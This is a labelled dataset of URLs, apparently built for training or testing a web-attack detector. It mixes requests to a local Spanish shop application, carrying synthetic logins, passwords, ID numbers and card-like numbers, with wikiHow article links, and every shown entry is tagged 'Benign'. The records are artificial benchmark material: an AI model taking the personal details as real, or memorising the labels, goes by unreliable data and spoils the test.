http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bortolus&pwd=pale%21ontol%f3gico&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=yokan&password=ago8a&nombre=bahia&apellidos=larrea+jover&email=parchment%40itrends.ic&dni=00592508m&direccion=praza+del+tronco%2c+183%2c+1c&ciudad=sils&cp=06300&provincia=cuenca&ntc=7825531185719845&b1=registrar,Benign
http://www.wikihow.com/defend-devotion-to-the-virgin-mary&t=1396570309769&n=2942209&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3116&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=margy&password=a-lborotador&nombre=ram%f3n&apellidos=espadero+volonte&email=lecourtois%40n340magazin.kh&dni=24703472t&direccion=c%2f+quevedo%2c+100+2-h&ciudad=valderrodilla&cp=23528&provincia=%c1vila&ntc=0567313131655540&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tobiah8&password=som0&nombre=tarciano&apellidos=almenar&email=cansino%40indagacion.ms&dni=92723857r&direccion=c%2f+chinorlet+18%2c+&ciudad=entrambasaguas&cp=29490&provincia=m%e1laga&ntc=8807727465279989&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mathis&pwd=precipuamente&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=wiedman&pwd=2it77750i7&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kelcey&password=ov%e1rico&nombre=hansel&apellidos=puertolas+ocifuente&email=karlstadt%40pensionesbaratas.com.pg&dni=48258789m&direccion=paratge+padro+194%2c+11-a&ciudad=osera+de+ebro&cp=34305&provincia=salamanca&ntc=9922927157537340&b1=registrar,Benign
http://www.wikihow.com/get-a-new-look-with-remy-hair-extensions&t=1396592956198&n=3859299&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8570&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3690&b1=pasar+por+caja,Benign
http://www.wikihow.com/get-easy-hairspray-with-natural-products&t=1396592828219&n=3852919&k=mainentity,Benign
http://www.wikihow.com/find-an-old-boyfriend-on-facebook&t=1396629756556&n=5432549&k=mainentity,Benign
http://www.wikihow.com/be-in-style-as-a-petite-woman&t=1396569936614&n=2926797&k=mainentity,Benign
http://www.wikihow.com/act-elven-at-school&t=1396528021077&n=858425&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2272&b1=pasar+por+caja,Benign
http://www.wikihow.com/download-music-with-seeqpod&t=1396532204275&n=1055730&k=mainentity,Benign
http://www.wikihow.com/be-optimistic-when-your-boy-friend-has-left-you&t=1396516237194&n=243606&k=mainentity,Benign
http://www.wikihow.com/create-a-toon-in-disney%27s-toontown-online&t=1396647996140&n=5946539&k=mainentity,Benign
http://www.wikihow.com/transfer-existing-cable-tv-service-to-a-new-address&t=1396532138613&n=1052474&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=discover&pwd=.dote&remember=off&b1=entrar,Benign
http://www.wikihow.com/make-london-rat-juice&t=1396517164399&n=296593&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=44&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=castro-h&password=entre8e58r&nombre=deser%e9e&apellidos=per%f3&email=auric%40cafedeteatro.um&dni=04549087d&direccion=luis+montoto+38%2c+&ciudad=moriscos&cp=09199&provincia=burgos&ntc=8277692168362297&b1=registrar,Benign
http://www.wikihow.com/make-friends-with-a-girl-when-you%27re-bisexual-or-lesbian&t=1396571925031&n=3006773&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=brunner&pwd=ado666en29&remember=on&b1=entrar,Benign
http://www.wikihow.com/incorporate-olive-oil-into-a-beauty-regimen&t=1396593966559&n=3916524&k=mainentity,Benign
http://www.wikihow.com/eat-vegetarian-at-disney%27s-epcot-resort&t=1396527964558&n=855265&k=mainentity,Benign
http://www.wikihow.com/transfer-e107-to-joomla-using-cms2cms&t=1396533899844&n=1134113&k=mainentity,Benign
http://www.wikihow.com/connect-an-ide-hard-drive-to-a-laptop&t=1396532606755&n=1072156&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ing&password=so5re8r&nombre=yain&apellidos=cadengo+ro%edz&email=lantz%40joyclub.sj&dni=86539190b&direccion=calle+principe+de+asturias%2c+83+6e&ciudad=alic%fan&cp=19187&provincia=girona&ntc=0393152763591488&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=missagh&password=f%f3sforo&nombre=danilo&apellidos=lizancos&email=pambieri2%40ofertachina.uz&dni=71823012s&direccion=antonio+diaz+ca%f1abate%2c+4+&ciudad=sada&cp=26315&provincia=madrid&ntc=1872652721088386&b1=registrar,Benign
http://www.wikihow.com/enlarge-a-small-bathroom&t=1396562368985&n=2543464&k=mainentity,Benign
http://www.wikihow.com/organize-winter-clothes&t=1396518049249&n=355894&k=mainentity,Benign
http://www.wikihow.com/use-the-limechat-irc-client-app-for-ios&t=1396534150712&n=1146349&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7009&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=pepe&pwd=opulent3&remember=off&b1=entrar,Benign
http://www.wikihow.com/get-a-placement-in-ustream%e2%80%99s-mobile-apps&t=1396630052001&n=5444013&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mao&pwd=me08m0ento&remember=on&b1=entrar,Benign
http://www.wikihow.com/make-the-kishi-family-from-the-baby-sitters-club-in-sims-2&t=1396633574988&n=5531641&k=mainentity,Benign
http://www.wikihow.com/beat-the-spider-thingy-in-metroid:-fusion-(gba)&t=1396648896313&n=5985695&k=mainentity,Benign
http://www.wikihow.com/get-a-good-spray-tan&t=1396594013072&n=3918640&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=100&cantidad=22&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/create-an-ebook-cover-without-photoshop&t=1396527647264&n=841429&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6183&b1=confirmar,Benign
http://www.wikihow.com/shrink-dvd9-to-dvd5-with-aura4you-software&t=1396533822710&n=1131473&k=mainentity,Benign
http://www.wikihow.com/make-a-wallet-easily&t=1396609574696&n=4687345&k=mainentity,Benign
http://www.wikihow.com/educate-your-co-workers-about-gay-and-lesbian-issues&t=1396571895469&n=3005809&k=mainentity,Benign
http://www.wikihow.com/have-an-american-pioneer-party&t=1396546795834&n=1726108&k=mainentity,Benign
http://www.wikihow.com/make-maple-and-pecan-muffins&t=1396595211011&n=3981847&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=charin&password=cortezuda&nombre=cirano&apellidos=feliu&email=kaiser%40chinavende.tr&dni=84489760l&direccion=c%2f+ruiz%2c+s%2fn%2c+&ciudad=grajera&cp=48950&provincia=valladolid&ntc=8598802239343720&b1=registrar,Benign
http://www.wikihow.com/make-a-saltine-veggie-dish&t=1396546684849&n=1719220&k=mainentity,Benign
http://www.wikihow.com/make-kool-ade-lite&t=1396545779921&n=1661148&k=mainentity,Benign
http://www.wikihow.com/make-non-alcoholic-capirinha-ipanema&t=1396545832784&n=1664612&k=mainentity,Benign
http://www.wikihow.com/avoid-getting-your-free-forum-deleted&t=1396532267099&n=1058098&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=stasaski&password=ac1p55c6%f38&nombre=nadine&apellidos=aramburo+gasch&email=hull.jamin%40chicasdiabolo.km&dni=58340170a&direccion=c%2f+embalse+de+valdeca%f1as%2c+183%2c+&ciudad=calera+de+le%f3n&cp=03151&provincia=burgos&ntc=8993369761745604&b1=registrar,Benign
http://www.wikihow.com/stop-a-samsung-evergreen-sgh-a667-from-continuously-ringing&t=1396533549158&n=1118137&k=mainentity,Benign
http://www.wikihow.com/get-good-at-black-knight-(miniclip.com)&t=1396647941485&n=5943675&k=mainentity,Benign
http://www.wikihow.com/manage-a-joomla!-website-with-jsn-poweradmin&t=1396534113050&n=1144449&k=mainentity,Benign
http://www.wikihow.com/read-a-%22choose-your-fate%22-book&t=1396527787612&n=847177&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6094&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=maddox&password=h5sq3e1a1&nombre=math%edas&apellidos=huam%e0n+maltez&email=mouhamed9%40azkara.na&dni=25054750e&direccion=interior+parque+de+nazaret+140%2c+&ciudad=garrobo%2c+el&cp=29450&provincia=zamora&ntc=1541713650880969&b1=registrar,Benign
http://www.wikihow.com/build-a-temple-to-the-ancestors&t=1396570199418&n=2937209&k=mainentity,Benign
http://www.wikihow.com/include-children-during-a-home-renovation&t=1396609477035&n=4682938&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=85&cantidad=52&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/make-a-designer-show&t=1396546903732&n=1731452&k=mainentity,Benign
http://www.wikihow.com/make-it-a-fun-date&t=1396570821060&n=2962653&k=mainentity,Benign
http://www.wikihow.com/have-fabulous-wavy-hair&t=1396593145748&n=3870483&k=mainentity,Benign
http://www.wikihow.com/deal-with-overly-religious-parents&t=1396569990421&n=2929141&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=brooksba&password=tornea.dura&nombre=eslem&apellidos=penagos+pijoan&email=massen%40psychominders.to&dni=26178506k&direccion=vencejo+67+&ciudad=guijo%2c+el&cp=47194&provincia=las+palmas&ntc=8390203315766589&b1=registrar,Benign
http://www.wikihow.com/make-an-elfkin-home&t=1396569775738&n=2919437&k=mainentity,Benign
http://www.wikihow.com/make-candied-pecans&t=1396515733608&n=210833&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6342&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8490&b1=confirmar,Benign
http://www.wikihow.com/fix-display-problems-with-an-xbox-360&t=1396613576058&n=4820864&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ewald&password=y%e1mbico&nombre=monserrat&apellidos=bolado&email=escande.bousquet%40naturalagricolacantabria.ae&dni=42330028t&direccion=c%2f+ruiz+de+alarcon%2c+127%2c+&ciudad=olivares+de+j%facar&cp=40340&provincia=almer%eda&ntc=3901675406054430&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=myatt&password=nora&nombre=alpiniano&apellidos=puigdomenech+aguedo&email=shankley%40discon.sz&dni=22443459j&direccion=nuestra+se%f1ora+de+candelaria+17+7e&ciudad=aranda+de+duero&cp=19222&provincia=girona&ntc=8811866823125640&b1=registrar,Benign
http://www.wikihow.com/make-a-good-anti-aircraft-class-in-call-of-duty:-modern-warfare-3&t=1396649392775&n=6001683&k=mainentity,Benign
http://www.wikihow.com/make-a-custom-class-on-call-of-duty-4&t=1396649228620&n=5994687&k=mainentity,Benign
http://www.wikihow.com/dress-like-a-girl-for-transgendered&t=1396518029378&n=355050&k=mainentity,Benign
http://www.wikihow.com/set-up-satellite-tv-in-a-rural-area&t=1396534371404&n=1157117&k=mainentity,Benign
http://www.wikihow.com/be-one-of-the-most-famous-there-ever-was-on-roblox&t=1396647850274&n=5939687&k=mainentity,Benign
http://www.wikihow.com/perform-a-clean-install-of-windows-vista&t=1396610824874&n=4731282&k=mainentity,Benign
http://www.wikihow.com/juggle-clubs&t=1396527916530&n=853293&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=vipul&pwd=chapalear&remember=on&b1=entrar,Benign
http://www.wikihow.com/download-fruit-ninja-on-an-ipad-2&t=1396534201259&n=1148746&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=marsie&password=l0a%2b16ra&nombre=epuyen&apellidos=fonfr%eda+riutort&email=rosulkova8%40barnicesultravioleta.do&dni=68741807m&direccion=c%2f+yugoslavia%2c+86+10%3fa&ciudad=moraleja+de+sayago&cp=07519&provincia=palencia&ntc=3256313581077416&b1=registrar,Benign
http://www.wikihow.com/make-a-pimple-blasting-facial-treatment&t=1396594367977&n=3933957&k=mainentity,Benign
http://www.wikihow.com/fix-hal.dll-error&t=1396532853086&n=1084284&k=mainentity,Benign
http://www.wikihow.com/make-a-party-bag-from-your-jeans&t=1396546591476&n=1714728&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=trivedi9&pwd=po%e9tica&remember=off&b1=entrar,Benign
http://www.wikihow.com/clean-the-traps-of-a-venus-fly-trap&t=1396561860752&n=2514192&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=tangren&password=santidad&nombre=josiana&apellidos=bradaschia&email=hillhouse%40buscadordevideos.za&dni=14396172n&direccion=travesia+barreiro+68%2c+&ciudad=altarejos&cp=50369&provincia=lleida&ntc=7027295886067161&b1=registrar,Benign
http://www.wikihow.com/use-applian-technologies-replay-av&t=1396533828641&n=1131645&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3382&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9538&b1=confirmar,Benign
http://www.wikihow.com/break-a-coconut-at-home&t=1396546004790&n=1673736&k=mainentity,Benign
http://www.wikihow.com/have-a-good-day-with-bad-weather&t=1396569946820&n=2927233&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=paola&password=84m3ri156&nombre=vital&apellidos=escalante+privado&email=anse%40buenamandarina.int&dni=35036651s&direccion=c%2f+carrasqueta%2c+s%2fn%2c+3%3fg&ciudad=darro&cp=37775&provincia=tarragona&ntc=2571248103577461&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=560&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=520&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2358&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1509&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9187&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jiak-kwa&password=b8t7a&nombre=huen%fa&apellidos=patti+crespi&email=pitoef%40primeracasa-ebs.sm&dni=32760704x&direccion=c%2f+padilla+30+&ciudad=solivella&cp=05571&provincia=alicante&ntc=8475821879548666&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=bagnato33&password=olaje&nombre=yamand%fa&apellidos=siller+cotamo&email=groenning-kirwin%40corjet.kr&dni=43751597p&direccion=c%2f+joaquin+vayreda+53%2c+&ciudad=monterroso&cp=33798&provincia=burgos&ntc=1344407175784930&b1=registrar,Benign
http://www.wikihow.com/find-your-photographic-niche&t=1396632634899&n=5504740&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8742&b1=pasar+por+caja,Benign
http://www.wikihow.com/do-easy-fashion-diys&t=1396517946373&n=352254&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8561&b1=confirmar,Benign
http://www.wikihow.com/make-conger-eel-rice-bowl-in-harvest-moon:-animal-parade&t=1396649575466&n=6008538&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1491&b1=confirmar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=friedman&password=p6996raz9&nombre=her%e1clito&apellidos=merlos+umpi%e9rrez&email=strickland%40gestionsoftware.cl&dni=11130412e&direccion=c%2f+nogal+174+&ciudad=buenavista+del+norte&cp=05358&provincia=zaragoza&ntc=6313115481717860&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2883&b1=pasar+por+caja,Benign
http://www.wikihow.com/get-a-guy-at-an-after-school-lesson&t=1396611851205&n=4765590&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mary-mic&password=deo&nombre=juan&apellidos=marcapura+pachecote&email=alley%40thw-adm.kh&dni=87599877f&direccion=c%2f+vera+cruz%2c+97+3%3fh&ciudad=ruanes&cp=09349&provincia=%c1lava&ntc=2107485639768093&b1=registrar,Benign
http://www.wikihow.com/unpin-a-pin-on-pinterest&t=1396629665464&n=5428633&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1589&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1515&b1=confirmar,Benign
http://www.wikihow.com/find-out-if-your-friend-is-a-liar&t=1396571684873&n=2997477&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3055&b1=pasar+por+caja,Benign
http://www.wikihow.com/make-a-good-record-on-a-mechanical-phonograph&t=1396531945638&n=1044022&k=mainentity,Benign
http://www.wikihow.com/make-a-sugar-foot-scrub&t=1396593340027&n=3881552&k=mainentity,Benign
http://www.wikihow.com/write-on-myspace&t=1396629838955&n=5435689&k=mainentity,Benign
http://www.wikihow.com/create-your-own-canis-canem-edit/bully-character&t=1396528074335&n=861277&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=12&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/keep-your-bags-moisterized&t=1396594102415&n=3922752&k=mainentity,Benign
http://www.wikihow.com/change-your-behaviour-of-good-to-bad&t=1396526566616&n=790059&k=mainentity,Benign
http://www.wikihow.com/be-an-excellent-person&t=1396526551320&n=789395&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4015&b1=pasar+por+caja,Benign
http://www.wikihow.com/post-(when-riding-a-horse-at-jog/trot)&t=1396526859711&n=804852&k=mainentity,Benign
http://www.wikihow.com/make-payasam&t=1396527000621&n=815128&k=mainentity,Benign
http://www.wikihow.com/save-dsc-power&t=1396534259125&n=1151293&k=mainentity,Benign
http://www.wikihow.com/make-your-own-eyeshadow-with-an-app-and-cost-is-low&t=1396593479642&n=3890196&k=mainentity,Benign
http://www.wikihow.com/stop-songbird-from-cutting-off-the-end-of-every-song&t=1396533823545&n=1131501&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ada&password=suspicacia&nombre=ecio&apellidos=salvo+pardos&email=keat%40comercioenlacalle.mu&dni=10663563g&direccion=calle+isaac+peral+37%2c+&ciudad=jarque&cp=47440&provincia=huesca&ntc=2333052430103872&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=legrow&password=luli019&nombre=exequiel&apellidos=nielsen+thomas&email=schachter_sedgwick%40fuzzy.kn&dni=66020343q&direccion=calle+ciguela%2c+84+12%3fb&ciudad=tordera&cp=18538&provincia=teruel&ntc=3746503388770740&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2614&b1=confirmar,Benign
http://www.wikihow.com/make-a-cool-dinner-roll&t=1396595167989&n=3978123&k=mainentity,Benign
http://www.wikihow.com/completely-darken-a-room-on-a-budget&t=1396562024782&n=2523864&k=mainentity,Benign
http://www.wikihow.com/get-the-inviter-badge-on-roblox&t=1396647892488&n=5941575&k=mainentity,Benign
http://www.wikihow.com/cancel-a-bebo-account&t=1396629685431&n=5429617&k=mainentity,Benign
http://www.wikihow.com/buy-a-tv&t=1396534306749&n=1153765&k=mainentity,Benign
http://www.wikihow.com/make-a-lotion-bar-with-almond-oil&t=1396593525487&n=3892952&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9744&b1=confirmar,Benign
http://www.wikihow.com/boot-a-cd-on-mac-os-x&t=1396610701147&n=4726382&k=mainentity,Benign
http://www.wikihow.com/do-the-stairs-glitch-on-toontown&t=1396648002010&n=5947219&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2675&b1=pasar+por+caja,Benign
http://www.wikihow.com/sign-up-for-pinterest&t=1396629667329&n=5428713&k=mainentity,Benign
http://www.wikihow.com/date-a-teen-mother&t=1396612047898&n=4773414&k=mainentity,Benign
http://www.wikihow.com/buy-a-wood-stove&t=1396562280702&n=2538116&k=mainentity,Benign
http://www.wikihow.com/make-watermelon-gin&t=1396517179265&n=297585&k=mainentity,Benign
http://www.wikihow.com/age-wood-with-baking-soda&t=1396562842522&n=2575784&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=38&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=39&cantidad=22&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/get-to-the-%22run%22-window-in-windows-8&t=1396611476248&n=4754465&k=mainentity,Benign
http://www.wikihow.com/act-cool-with-only-a-few-friends-(girls)&t=1396571697031&n=2997865&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=goupil&pwd=desarzonar&remember=on&b1=entrar,Benign
http://www.wikihow.com/inspire-kids-to-tidy-up&t=1396609478801&n=4682998&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=peadar&password=4aj9ble&nombre=yamila&apellidos=angl%e8s+valenciano&email=valdesta%40arvigar.mm&dni=35726679c&direccion=av.+estacion+del+palo+135+3%3fc&ciudad=saelices&cp=18170&provincia=guadalajara&ntc=0610406833755933&b1=registrar,Benign
http://www.wikihow.com/improve-accuracy-in-arcanists&t=1396648960740&n=5987015&k=mainentity,Benign
http://www.wikihow.com/encrypt-documents-in-kingsoft-office-2012&t=1396533948713&n=1136097&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=please_d&pwd=afablemente&remember=off&b1=entrar,Benign
http://www.wikihow.com/calculate-an-apy-of-a-bond&t=1396613388168&n=4816335&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4113&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/miembros.jsp,Benign
http://www.wikihow.com/do-a-180-on-a-scooter&t=1396531396118&n=1018021&k=mainentity,Benign
http://www.wikihow.com/make-vegan-buche-de-noel&t=1396546391469&n=1701324&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hollings&pwd=p9a1a&remember=off&b1=entrar,Benign
http://www.wikihow.com/make-pick-me-up-cocktails&t=1396517243051&n=300733&k=mainentity,Benign
http://www.wikihow.com/be-friends-with-you&t=1396571297792&n=2982985&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=warwick&password=bol%edvar&nombre=saiguen&apellidos=utge+taricco&email=godard%403horas.bu&dni=54558019h&direccion=calle+avila+165%2c+&ciudad=cenlle&cp=05461&provincia=tarragona&ntc=4347401391003066&b1=registrar,Benign
http://www.wikihow.com/grow-plants-in-a-green-house&t=1396561565641&n=2496596&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=25&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/get-into-gosupermodels-popular-groups&t=1396648157303&n=5953779&k=mainentity,Benign
http://www.wikihow.com/retrieve-a-small-item-from-a-washbasin-sink-drain&t=1396562984402&n=2586248&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=robitail&pwd=quintillo&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6829&b1=confirmar,Benign
http://www.wikihow.com/design-a-perennial-garden&t=1396561946938&n=2519184&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dane&password=_i4di7a9&nombre=dugal&apellidos=payas+credid%edo&email=rajnay%40zytel.il&dni=96676147v&direccion=pasaje+adra%2c+147%2c+7%3fd&ciudad=bustillo+del+p%e1ramo+de+carri%f3n&cp=23370&provincia=huesca&ntc=8338139974007046&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hering&password=si1_ar&nombre=sof%eda&apellidos=sol%e0s+cachiner&email=straight%40tobarisch.kz&dni=11103890l&direccion=calle+trafalgar+s%2fn%2c+2-c&ciudad=paredes+de+sig%fcenza&cp=05416&provincia=baleares+%28illes%29&ntc=4602024078447794&b1=registrar,Benign
http://www.wikihow.com/make-a-hibiscus-cooler&t=1396517142993&n=295373&k=mainentity,Benign
http://www.wikihow.com/beat-the-pylraster-in-final-fantasy-xii&t=1396649430978&n=6003123&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=zielinsk4&password=rostrada&nombre=melquiades&apellidos=cebolla+villablanca&email=popovic%40hostingprofessional.com.mil&dni=96579653p&direccion=callejon+conde+125%2c+&ciudad=santa+eug%e8nia&cp=26329&provincia=zaragoza&ntc=9689984032459849&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jesse&password=symmetry&nombre=giovanna&apellidos=pall%e1s+posada&email=descaut%40aou.com.rs&dni=39759775c&direccion=calle+de+la+nena+casas%2c+70+2h&ciudad=bullas&cp=32520&provincia=teruel&ntc=6506498264883421&b1=registrar,Benign
http://www.wikihow.com/emulate-the-saints&t=1396564152620&n=2654230&k=mainentity,Benign
http://www.wikihow.com/give-your-hair-a-quick-fix&t=1396592802314&n=3851703&k=mainentity,Benign
http://www.wikihow.com/get-auto-insurance-for-the-lowest-price&t=1396613283438&n=4812575&k=mainentity,Benign
http://www.wikihow.com/make-melvina%27s-bannock&t=1396545970396&n=1671744&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2356&b1=pasar+por+caja,Benign
http://www.wikihow.com/make-a-cardboard-clubhouse-for-toddlers&t=1396563692353&n=2629206&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=giblin3&password=3e5enc66&nombre=levinia&apellidos=casaramon+tetatzin&email=delon%40tintasultravioleta.tl&dni=56370705m&direccion=c%2f+ancha+178+&ciudad=co%edn&cp=37874&provincia=cuenca&ntc=2223234407684765&b1=registrar,Benign
http://www.wikihow.com/make-organic-lotion&t=1396593544766&n=3894152&k=mainentity,Benign
http://www.wikihow.com/change-screen-resolution-in-ubuntu&t=1396610583324&n=4720750&k=mainentity,Benign
http://www.wikihow.com/deal-with-someone-who-fancies-you-who-you-don%27t-fancy-back&t=1396612186488&n=4779046&k=mainentity,Benign
http://www.wikihow.com/go-4-wheeling&t=1396531367994&n=1016769&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=tipping&password=anita&nombre=cesarian&apellidos=bujald%f3n+casagran&email=houk%40auditar.com.ru&dni=35726129e&direccion=calle+tio+gregorio+borrico%2c+120+&ciudad=ribes+de+freser&cp=15801&provincia=zamora&ntc=1539292218607992&b1=registrar,Benign
http://www.wikihow.com/make-a-mango-colado&t=1396517143786&n=295425&k=mainentity,Benign
http://www.wikihow.com/act-like-audrey-hepburn&t=1396526495514&n=787091&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=delia&password=1ronda&nombre=gandulfo&apellidos=urmeneta+gasulla&email=celarie%40beautifulbody.ru&dni=98695672g&direccion=calle+algenib+33+7%3fa&ciudad=gema&cp=05635&provincia=guadalajara&ntc=6526213945768499&b1=registrar,Benign
http://www.wikihow.com/grow-a-perfect-garden&t=1396561954097&n=2519596&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=patches7&pwd=0u993d2r&remember=on&b1=entrar,Benign
http://www.wikihow.com/dress-for-synagogue&t=1396570346976&n=2943705&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=leary&password=ar-quetipo&nombre=paola&apellidos=jaime&email=bower_pinheiro%40simulacion-credito.tn&dni=84155094a&direccion=mateu+de+malferit%2c+140%2c+6-h&ciudad=bustillo+del+oro&cp=25225&provincia=c%f3rdoba&ntc=2511625444669752&b1=registrar,Benign
http://www.wikihow.com/fully-break-down-a-hp-laptop-after-a-spill&t=1396532714548&n=1076436&k=mainentity,Benign
http://www.wikihow.com/do-joseon-makeup-(korean-traditional-makeup)&t=1396593845612&n=3910292&k=mainentity,Benign
http://www.wikihow.com/put-aloe-vera-oil-in-your-hair&t=1396516484088&n=255242&k=mainentity,Benign
